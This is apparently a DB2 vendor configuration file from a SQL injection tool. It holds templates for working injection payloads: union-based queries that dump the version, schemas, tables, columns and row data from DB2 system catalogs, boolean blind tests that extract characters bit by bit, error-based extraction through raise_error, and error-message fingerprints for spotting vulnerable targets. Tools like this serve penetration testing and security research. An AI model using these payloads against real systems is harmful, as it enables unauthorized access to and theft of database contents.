vendor: DB2
# jdbc:db2://localhost:50000/testdb
# db2inst1 test

resource:
 info: |
  select
      versionnumber
      || '${enclose_value_sql}'
      || current server
      || '${enclose_value_sql}'
      || user
      || '${trail_sql}'
  from sysibm.sysversions

 schema:
  database: |
   select varchar(
       listagg(
           '${enclose_value_sql}'
           || trim(schemaname)
           || '${separator_qte_sql}0${enclose_value_sql}'
       )
       || '${trail_sql}'
   )
   from syscat.schemata
   ${limit}

  table: |
   select varchar(
       listagg(
           '${enclose_value_sql}'
           || trim(name)
           || '${separator_qte_sql}0${enclose_value_sql}'
       )
       || '${trail_sql}'
   )
   from sysibm.systables
   where creator = '${database}'
   ${limit}

  column: |
   select varchar(
       listagg(
           '${enclose_value_sql}'
           || trim(name)
           || '${separator_qte_sql}0${enclose_value_sql}'
       )
       || '${trail_sql}'
   )
   from sysibm.syscolumns
   where coltype != 'BLOB'
   and tbcreator = '${database}'
   and tbname = '${table}'
   ${limit}

  row:
   query: |
    /**
     * listagg limit is 4000 and aggregate all data before limit is applied
     * => subquery
     */
    select varchar(
        listagg(
            '${enclose_value_sql}'
            || s
            || '${separator_qte_sql}1${enclose_value_sql}'
        )
        || '${trail_sql}'
    )
    from (
        select ${fields} s
        from ${database}.${table}
        ${limit}
    )
   fields:
    field: |
     trim(
         coalesce(
             varchar(
                 ${field.value}
                 || ''
             ),
             ''
         )
     )
    concat: "|| '%7f' ||"

strategy:
 configuration:
  slidingWindow: |
   (
       select
           varchar(
               replace(
                   '${lead}'
                   || substr (
                       (${injection}),
                       ${window.char}
                   ),
                   '${lead}${trail_sql}',
                   '${lead}'
               )
           )
       from sysibm.sysdummy1
   )
  limit: limit ${limit.value}, 5
  failsafe: varchar('' || (1337${indice}7330%2b1), 1024)
  calibrator: |
   rpad(
       '${calibrator_sql}',
       1024,
       '${calibrator_sql}'
   )
  limitBoundary: 0
  endingComment: --+-
  fingerprint:
   errorMessage:
    # Spring
    - 'DB2 SQL Error: SQLCODE=.*, SQLSTATE=.*, SQLERRMC=.*, DRIVER=.*'
    # Other
    - function.db2
    - 'Warning: db2_execute()'
    - 'Warning: db2_fetch_array()'
   orderByErrorMessage:
    - 'DB2 SQL Error: SQLCODE=.*, SQLSTATE=.*, SQLERRMC=.*, DRIVER=.*'

 normal:
  indices: union select ${indices} from sysibm.sysdummy1
  capacity: |
   /**
    * repeat gets internal table size error on blind 'where 1=1'
    * => uses rpad instead
    */
   varchar('${lead}${indice}' || ${calibrator}, 1024)
  orderBy: order by 1337

 boolean:
  test:
   falses:
    - 1 = 0
    - "'a' %21= 'a'"
    - "'b' %21= 'b'"
    - 1 = 2
    - 1 %21= 1
    - 2 %21= 2
   trues:
    - 0 = 0
    - "'a' %21= 'b'"
    - "'a' = 'a'"
    - 1 = 1
    - 2 = 2
    - 1 %21= 2
   initialization: 0%2b1 = 1
   bit: |
    0 != bitand(
        ascii(
            substr(
                ${injection},
                ${window.char},
                1
            )
        ),
        ${bit}
    )
   length: length(${injection}) > ${window.char}
  modeAnd: and
  modeOr: or
  blind: ${boolean.mode} ${test}
  
 error:
  method:
  
   # RAISE_ERROR() interpreted whatever :OR :AND
   - name: RAISE_ERROR
     query: |
      /* DB2 SQL Error: SQLCODE=-438, SQLSTATE=70001, SQLERRMC=<sqli>, DRIVER=3.69.24 [SQL State=70001, DB Errorcode=-438] */
      or 1=(select raise_error('70001',(
          ${window}
      )) from SYSIBM.SYSDUMMY1)
     # TODO Add to SQLEngine
     capacity: 70